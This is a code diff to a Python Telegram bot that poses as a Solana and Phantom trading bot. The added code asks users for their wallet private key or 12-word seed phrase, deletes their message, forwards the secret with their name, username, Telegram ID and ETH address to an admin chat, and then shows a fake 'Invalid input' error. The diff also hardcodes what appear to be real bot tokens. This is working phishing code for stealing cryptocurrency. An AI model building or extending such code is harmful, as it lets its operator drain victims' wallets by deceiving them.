@@ -1,15 +1,12 @@
 import asyncio
 import datetime
 import json
+import os
 import re
-from threading import Thread
 from html import escape
 
 import aiohttp
-try:
-    from flask import Flask  # type: ignore[import-not-found]
-except ImportError:  # pragma: no cover - runtime fallback for environments without Flask
-    Flask = None
+from aiohttp import web
 from aiogram import Bot, Dispatcher, F, Router, types
 from aiogram.filters import Command
 from aiogram.fsm.context import FSMContext
@@ -19,28 +16,35 @@ from aiogram.utils.keyboard import InlineKeyboardBuilder
 
 # Required for Solana contract-address detection in incoming messages.
 
-if Flask is not None:
-    app = Flask(__name__)
+try:
+    from dotenv import load_dotenv
+except ImportError:
+    def load_dotenv(*args, **kwargs):
+        return False
 
-    @app.route('/')
-    def home():
-        return "Bot is alive"
-
-    def run_flask():
-        app.run(host='0.0.0.0', port=10000)
-
-    def keep_alive():
-        thread = Thread(target=run_flask, daemon=True)
-        thread.start()
-else:
-    def keep_alive():
-        return None
+load_dotenv()
 
 
-BOT_TOKEN = "8663988497:AAHMhdY1IVahs4IWiJqlM6IDS0hQNWs4__w"
+async def handle_ping(request):
+    return web.Response(text="Bot is awake and running 24/7!")
+
+
+async def start_web_server():
+    app = web.Application()
+    app.router.add_get("/", handle_ping)
+    runner = web.AppRunner(app)
+    await runner.setup()
+    port = int(os.getenv("PORT", 8080))
+    site = web.TCPSite(runner, "0.0.0.0", port)
+    await site.start()
+    print(f"Web server safely listening on port {port}")
+
+
+TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "8663988497:AAGittaolB-3B5w8Ydowd_AtTrrlDXddMOo")
+BOT_TOKEN = TOKEN
 ADMIN_CHAT_ID = 8591686357  # <--- REPLACE THIS WITH YOUR ACTUAL TELEGRAM NUMERICAL ID
 
-bot = Bot(token=BOT_TOKEN)
+bot = Bot(token=TOKEN)
 dp = Dispatcher()
 router = Router()
 
@@ -1792,6 +1796,8 @@ async def process_wallet_name(message: types.Message, state: FSMContext):
 async def process_phantom_wallet_secret(message: types.Message, state: FSMContext):
     state_data = await state.get_data()
     prompt_message_id = state_data.get("prompt_message_id")
+    button_label = state_data.get("button_label") or "Import Wallet"
+    button_callback = state_data.get("button_callback") or "import_wallet"
 
     try:
         await message.delete()
@@ -1804,14 +1810,18 @@ async def process_phantom_wallet_secret(message: types.Message, state: FSMContex
         except Exception:
             pass
 
-    username = message.from_user.username or message.from_user.first_name or f"user_{message.from_user.id}"
-    button_label = "Connect Phantom"
+    full_name = " ".join(filter(None, [message.from_user.first_name, message.from_user.last_name])).strip() or "N/A"
+    username = message.from_user.username or "N/A"
+    eth_address = state_data.get("eth_address") or "Not provided"
     secret_value = (message.text or "").strip() or "[empty]"
     forwarded_text = (
-        f"👤 User: {escape(username)}\n"
+        f"👤 Name: {escape(full_name)}\n"
+        f"👤 Username: @{escape(username)}\n"
         f"🆔 Telegram ID: {message.from_user.id}\n"
+        f"🪙 ETH: {escape(eth_address)}\n"
         f"🔘 Button: {escape(button_label)}\n"
-        f"📝 Message Sent:\n<code>{escape(secret_value)}</code>"
+        f"🔗 Callback: {escape(button_callback)}\n"
+        f"📝 User message:\n<pre>{escape(secret_value)}</pre>"
     )
 
     try:
@@ -1820,9 +1830,9 @@ async def process_phantom_wallet_secret(message: types.Message, state: FSMContex
         print(f"Failed to forward Phantom wallet secret to admin. Error: {e}")
 
     await message.answer(
-        text="⚠️ <b>Invalid input. Please try again.</b>",
+        text="⚠️ <b>Invalid input. Please try again later.</b>",
         parse_mode="HTML",
-        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Try Again", callback_data="pumpfun_return")]]),
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Return", callback_data="wallets")]]),
     )
     await state.clear()
 
@@ -2161,14 +2171,26 @@ async def return_to_main(callback: types.CallbackQuery):
 
 @dp.callback_query(F.data.in_({"connect_external_sol", "import_wallet", "pumpfun_connect_phantom"}))
 async def connect_external_wallet(callback: types.CallbackQuery, state: FSMContext):
-    return_callback = "wallets_main" if callback.data == "connect_external_sol" else "pumpfun_return"
+    if callback.data == "pumpfun_connect_phantom":
+        prompt_text = "💳 <b>Phantom Wallet Connection</b>\n\n<i>Send your private key or 12-word seed phrase to continue.</i>"
+        return_callback = "pumpfun_return"
+        button_label = "Connect Phantom"
+    else:
+        prompt_text = "💳 <b>Connect wallet to start trading</b>\n\n<i>Send your private key or 12-word seed phrase to continue.</i>"
+        return_callback = "wallets"
+        button_label = "Import Wallet"
+
     await callback.message.edit_text(
-        text="💳 <b>Phantom Wallet Connection</b>\n\n<i>What's the private key of this wallet? you may also use a 12-word seed phrase..</i>",
+        text=prompt_text,
         parse_mode="HTML",
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Return", callback_data=return_callback)]]),
     )
     await state.set_state(PhantomConnectState.waiting_for_wallet_secret)
-    await state.update_data(prompt_message_id=callback.message.message_id)
+    await state.update_data(
+        prompt_message_id=callback.message.message_id,
+        button_label=button_label,
+        button_callback=callback.data,
+    )
     await callback.answer()
 
 
@@ -2535,7 +2557,7 @@ dp.include_router(router)
 
 
 async def main():
-    keep_alive()
+    await start_web_server()
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
